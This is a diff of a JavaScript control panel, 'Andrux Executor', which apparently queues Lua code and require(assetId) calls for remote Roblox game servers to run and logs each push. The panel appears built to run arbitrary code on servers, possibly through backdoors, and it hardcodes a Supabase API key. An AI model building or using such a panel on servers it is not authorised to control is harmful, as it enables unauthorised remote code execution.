@@ -1,248 +1,186 @@
-/* Andrux Executor — Lua script execution + game list
-   Fixes:
-   - Removed require mode, only Lua remains
-   - Proper execution logging (every execution increments counter)
-   - Target server selection from game list
-   - Character count display
-*/
+/* Andrux Executor — Lua/Require mode toggle + require(assetId) push */
 (function(){
 'use strict';
 
 var SU='https://nyourvnfzhxbofwmavgq.supabase.co';
 var SK='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im55b3Vydm5memh4Ym9md21hdmdxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODUwOTYwMTIsImV4cCI6MjEwMDY3MjAxMn0.YqztdjSz8kDAf9sHpqVeiMLjfwSbl4kvc8O5sGyJkvg';
 var TABLE='ax_gs';
+var BINDINGS_TABLE='ax_rb';
 var HDRS={apikey:SK,Authorization:'Bearer '+SK,'Content-Type':'application/json'};
-var STALE_MS=5*60*1000;
 
 function $(id){return document.getElementById(id);}
 
 function toast(msg){
-  var el=$('toast');if(!el)return;
-  el.textContent=msg;el.classList.add('show');
-  clearTimeout(toast._t);
-  toast._t=setTimeout(function(){el.classList.remove('show');},2000);
+var el=$('toast');if(!el)return;
+el.textContent=msg;el.classList.add('show');
+clearTimeout(toast._t);
+toast._t=setTimeout(function(){el.classList.remove('show');},2000);
 }
 
-function tt(k){return(window.I18N&&window.I18N.t)?window.I18N.t(k):k;}
-
 function apiGet(path){
-  return fetch(SU+'/rest/v1/'+path,{headers:HDRS}).then(function(r){return r.json();});
+return fetch(SU+'/rest/v1/'+path,{headers:HDRS}).then(function(r){return r.json();});
 }
 
 function apiPatch(path,body){
-  return fetch(SU+'/rest/v1/'+path,{
-    method:'PATCH',
-    headers:Object.assign({},HDRS,{Prefer:'return=minimal'}),
-    body:JSON.stringify(body)
-  }).then(function(r){if(!r.ok)throw new Error('HTTP '+r.status);return r;});
+return fetch(SU+'/rest/v1/'+path,{
+method:'PATCH',
+headers:Object.assign({},HDRS,{Prefer:'return=minimal'}),
+body:JSON.stringify(body)
+}).then(function(r){if(!r.ok)throw new Error('HTTP '+r.status);return r;});
 }
 
 /* ===== Execution log: insert into ax_exec_log + bump local counter ===== */
-/* Called EVERY time a script is executed — no dedup, no flags */
 function logExec(placeId,robloxName,source){
-  try{
-    var n=(parseInt(localStorage.getItem('andrux_total_execs')||'0',10)||0)+1;
-    localStorage.setItem('andrux_total_execs',String(n));
-    window.dispatchEvent(new CustomEvent('andrux_exec_logged',{detail:{total:n}}));
-  }catch(e){}
-  return fetch(SU+'/rest/v1/ax_exec_log',{
-    method:'POST',
-    headers:Object.assign({},HDRS,{Prefer:'return=minimal'}),
-    body:JSON.stringify({place_id:String(placeId),roblox_name:robloxName||null,source:source||'lua'})
-  }).catch(function(){});
+try{
+var n=(parseInt(localStorage.getItem('andrux_total_execs')||'0',10)||0)+1;
+localStorage.setItem('andrux_total_execs',String(n));
+window.dispatchEvent(new CustomEvent('andrux_exec_logged',{detail:{total:n}}));
+}catch(e){}
+return fetch(SU+'/rest/v1/ax_exec_log',{
+method:'POST',
+headers:Object.assign({},HDRS,{Prefer:'return=minimal'}),
+body:JSON.stringify({place_id:String(placeId),roblox_name:robloxName||null,source:source})
+}).catch(function(){});
 }
-
-/* ===== Game list for target selection ===== */
-var _games=[];
-var _selectedPlaceId=null;
 
 function hideOffline(){
   try{return localStorage.getItem('andrux_hide_offline')==='1';}catch(e){return false;}
 }
 
-function isGameAlive(g){
-  if(!g||g.status!=='online')return false;
-  if(!g.last_heartbeat)return false;
-  var hb=new Date(g.last_heartbeat).getTime();
-  if(isNaN(hb))return false;
-  return (Date.now()-hb)<=STALE_MS;
-}
-
 function loadGames(){
-  var list=$('execGameList');
-  if(!list)return;
-  apiGet(TABLE+'?select=place_id,game_name,player_count,status,last_heartbeat,hidden&hidden=eq.false&order=last_heartbeat.desc')
-  .then(function(rows){
-    if(!rows||!rows.length){
-      _games=[];
-      list.innerHTML='<div style="text-align:center;padding:16px;color:var(--muted);font-size:13px">'+tt('exec.no_games')+'</div>';
-      return;
-    }
-    var hideOff=hideOffline();
-    _games=rows.filter(function(r){
-      var alive=isGameAlive(r);
-      if(hideOff&&!alive)return false;
-      return true;
-    });
-    if(_games.length===0){
-      list.innerHTML='<div style="text-align:center;padding:16px;color:var(--muted);font-size:13px">'+tt('exec.no_games')+'</div>';
-      return;
-    }
-    list.innerHTML=_games.map(function(g){
-      var alive=isGameAlive(g);
-      var name=g.game_name||g.place_id;
-      var pc=alive?(g.player_count||0):0;
-      var sel=g.place_id===_selectedPlaceId;
-      return '<div class="exec-game-item '+(alive?'online':'offline')+(sel?' selected':'')+'" data-place="'+g.place_id+'">'+
-        '<div class="exec-game-info">'+
-          '<b>'+name+'</b>'+
-          '<small>'+(alive?(pc+' 名玩家'):'离线')+'</small>'+
-        '</div>'+
-        '<span class="exec-game-status '+(alive?'online':'offline')+'">'+(alive?'在线':'离线')+'</span>'+
-      '</div>';
-    }).join('');
-    // Bind clicks
-    list.querySelectorAll('.exec-game-item').forEach(function(item){
-      item.addEventListener('click',function(){
-        if(item.classList.contains('offline'))return;
-        _selectedPlaceId=item.getAttribute('data-place');
-        list.querySelectorAll('.exec-game-item').forEach(function(i){i.classList.remove('selected');});
-        item.classList.add('selected');
-        updateExecuteButton();
-      });
-    });
-  })
-  .catch(function(){
-    list.innerHTML='<div style="text-align:center;padding:16px;color:var(--bad);font-size:13px">'+tt('admin.load_fail')+'</div>';
-  });
+var sel=$('execRequireGame');
+if(!sel)return;
+apiGet(TABLE+'?select=place_id,game_name,player_count,status&hidden=eq.false&order=game_name.asc')
+.then(function(rows){
+if(!rows||!rows.length){sel.innerHTML='<option value="">没有服务器</option>';return;}
+var hideOff=hideOffline();
+var filtered=rows.filter(function(r){
+  if(hideOff&&r.status!=='online')return false;
+  return true;
+});
+if(!filtered.length){
+  sel.innerHTML='<option value="">'+(hideOff?'没有在线服务器':'没有服务器')+'</option>';
+  return;
+}
+sel.innerHTML=filtered.map(function(r){
+var name=r.game_name||r.place_id;
+var pc=(r.status==='online')?(r.player_count||0):0;
+var statusTag=(r.status==='online')?'':' [离线]';
+return'<option value="'+r.place_id+'"'+(r.status==='online'?'':' data-offline="1"')+'>'+name+statusTag+' ('+pc+')</option>';
+}).join('');
+})
+.catch(function(){sel.innerHTML='<option value="">加载失败</option>';});
 }
 
-function updateExecuteButton(){
-  var btn=$('execSendBtn');
-  var st=$('execStatus');
-  if(!btn)return;
-  var input=$('execScriptInput');
-  var script=(input?input.value:'').trim();
-  if(!_selectedPlaceId){
-    btn.disabled=true;
-  }else if(!script){
-    btn.disabled=true;
-  }else{
-    btn.disabled=false;
-  }
+function parseAsset(input){
+input=(input||'').trim();
+var m=input.match(/^(\d+)([\.:]?[A-Za-z_]\w*)?$/);
+if(!m)return null;
+return{asset_id:m[1],suffix:m[2]||''};
 }
 
-function updateCharCount(){
-  var cc=$('execCharCount');
-  var input=$('execScriptInput');
-  if(!cc||!input)return;
-  cc.textContent=input.value.length+tt('exec.char_unit');
+function pushRequire(){
+var sel=$('execRequireGame');
+var inp=$('execRequireInput');
+var usr=$('execRequireUser');
+var st=$('execRequireStatus');
+var btn=$('execRequireSendBtn');
+if(!sel||!inp)return;
+
+var placeId=sel.value;
+if(!placeId){toast('请选择目标服务器');return;}
+
+var parsed=parseAsset(inp.value);
+if(!parsed){toast('资产 ID 格式错误，应为纯数字或 12345.func / 12345:method');return;}
+
+var username=(usr?usr.value:'').trim();
+
+var entry={type:'asset',asset_id:parsed.asset_id,suffix:parsed.suffix,username:username};
+
+btn.disabled=true;btn.textContent='推送中...';
+if(st)st.textContent='正在推送到服务器...';
+
+apiGet(TABLE+'?select=exec_queue&place_id=eq.'+placeId)
+.then(function(rows){
+var queue=[];
+if(rows&&rows[0]&&Array.isArray(rows[0].exec_queue)){
+queue=rows[0].exec_queue;
+}
+queue.push(entry);
+return apiPatch(TABLE+'?place_id=eq.'+placeId,{exec_queue:queue});
+})
+.then(function(){
+logExec(placeId,username,'exec_asset');
+toast('已推送: require('+parsed.asset_id+')'+parsed.suffix+'("'+username+'")');
+if(st)st.textContent='已推送 require('+parsed.asset_id+')'+parsed.suffix+'("'+username+'")';
+inp.value='';
+})
+.catch(function(err){
+toast('推送失败:'+(err.message||err));
+if(st)st.textContent='推送失败';
+})
+.then(function(){
+btn.disabled=false;btn.textContent='推送执行';
+});
 }
 
-/* ===== Execute Lua script ===== */
-var _executing=false;
-
-function executeLua(){
-  if(_executing)return;
-  var btn=$('execSendBtn');
-  var st=$('execStatus');
-  var input=$('execScriptInput');
-  if(!btn||!input)return;
-
-  var script=input.value;
-  if(!script||!script.trim()){toast(tt('exec.empty_script')||'请输入脚本内容');return;}
-  if(!_selectedPlaceId){toast(tt('exec.select_game_first')||'请先选择目标服务器');return;}
-
-  var placeId=_selectedPlaceId;
-  var game=_games.find(function(g){return g.place_id===placeId;});
-  var gameName=game?(game.game_name||placeId):placeId;
-
-  _executing=true;
-  btn.disabled=true;
-  btn.textContent=tt('exec.pushing')||'执行中...';
-  if(st)st.textContent=(tt('exec.sending_to')||'正在推送到 ')+gameName+'...';
-
-  apiGet(TABLE+'?select=exec_queue&place_id=eq.'+encodeURIComponent(placeId))
-  .then(function(rows){
-    var queue=[];
-    if(rows&&rows[0]&&Array.isArray(rows[0].exec_queue)){
-      queue=rows[0].exec_queue;
-    }
-    queue.push({type:'lua',script:script});
-    return apiPatch(TABLE+'?place_id=eq.'+encodeURIComponent(placeId),{exec_queue:queue});
-  })
-  .then(function(){
-    // Log execution EVERY time — no dedup, no flags
-    logExec(placeId,null,'lua');
-    toast((tt('exec.sent_to')||'已推送到 ')+gameName);
-    if(st){st.textContent=(tt('exec.sent_success')||'已成功推送到 ')+gameName;st.className='notice ok';}
-  })
-  .catch(function(err){
-    toast((tt('exec.send_fail')||'推送失败: ')+(err.message||err));
-    if(st){st.textContent=(tt('exec.send_fail')||'推送失败: ')+(err.message||err);st.className='notice bad';}
-  })
-  .then(function(){
-    _executing=false;
-    btn.disabled=false;
-    btn.textContent=tt('exec.execute')||'执行';
-    updateExecuteButton();
-  });
+function setupModeToggle(){
+var btns=document.querySelectorAll('.exec-mode-btn');
+if(!btns.length)return;
+btns.forEach(function(btn){
+btn.onclick=function(){
+var mode=btn.getAttribute('data-mode');
+btns.forEach(function(b){
+b.classList.remove('active');
+b.style.background='var(--surface)';
+b.style.color='var(--muted)';
+});
+btn.classList.add('active');
+btn.style.background='var(--accent)';
+btn.style.color='#fff';
+var lua=$('execLuaPanel');
+var req=$('execRequirePanel');
+if(lua)lua.style.display=mode==='lua'?'':'none';
+if(req)req.style.display=mode==='require'?'':'none';
+};
+});
 }
 
-function clearEditor(){
-  var input=$('execScriptInput');
-  if(input){input.value='';updateCharCount();updateExecuteButton();}
-  var st=$('execStatus');
-  if(st){st.textContent=tt('exec.status_idle')||'选择一个在线服务器，输入脚本后执行。';st.className='notice';}
-}
-
-/* ===== Init ===== */
-var _inited=false;
+var _execInterval=false;
 function init(){
-  if(_inited)return;
-  var btn=$('execSendBtn');
-  if(!btn)return;
-  var input=$('execScriptInput');
-  if(!input)return;
+var btn=$('execRequireSendBtn');
+if(!btn)return;
 
-  btn.addEventListener('click',executeLua);
+btn.onclick=pushRequire;
 
-  var clearBtn=$('execClearBtn');
-  if(clearBtn)clearBtn.addEventListener('click',clearEditor);
+var clr=$('execRequireClearBtn');
+if(clr)clr.onclick=function(){
+var i=$('execRequireInput'),u=$('execRequireUser'),s=$('execRequireStatus');
+if(i)i.value='';
+if(u)u.value='';
+if(s)s.textContent='已清空';
+};
 
-  if(input){
-    input.addEventListener('input',function(){
-      updateCharCount();
-      updateExecuteButton();
-    });
-    // Ctrl+Enter to execute
-    input.addEventListener('keydown',function(e){
-      if(e.ctrlKey&&e.key==='Enter'){e.preventDefault();executeLua();}
-    });
-  }
+var ref=$('execRequireRefreshBtn');
+if(ref)ref.onclick=function(){loadGames();toast('已刷新服务器列表');};
 
-  var refreshBtn=$('execRefreshGames');
-  if(refreshBtn)refreshBtn.addEventListener('click',function(){loadGames();toast(tt('admin.refresh'));});
+setupModeToggle();
 
-  updateCharCount();
-  updateExecuteButton();
-  loadGames();
-
-  _inited=true;
-
-  // Periodic game list refresh
-  setInterval(loadGames,30000);
+if(!_execInterval){
+_execInterval=true;
+loadGames();
+setInterval(loadGames,30000);
+}
 }
 
 if(document.readyState==='loading'){
-  document.addEventListener('DOMContentLoaded',init);
+document.addEventListener('DOMContentLoaded',init);
 }else{init();}
-setTimeout(init,500);
-setTimeout(init,2000);
+setTimeout(init,1000);
+setTimeout(init,3000);
 
 var _obs=new MutationObserver(function(){
-  if(_inited){_obs.disconnect();return;}
-  setTimeout(init,100);
+setTimeout(init,100);
 });
 _obs.observe(document.body,{childList:true,subtree:true});
 
@@ -252,5 +190,5 @@ window.addEventListener('storage',function(e){
 });
 window.addEventListener('andrux_hide_offline_change',function(){loadGames();});
 
-window.AxExec={reload:loadGames,execute:executeLua};
+window.AxExecAsset={reload:loadGames};
 })();
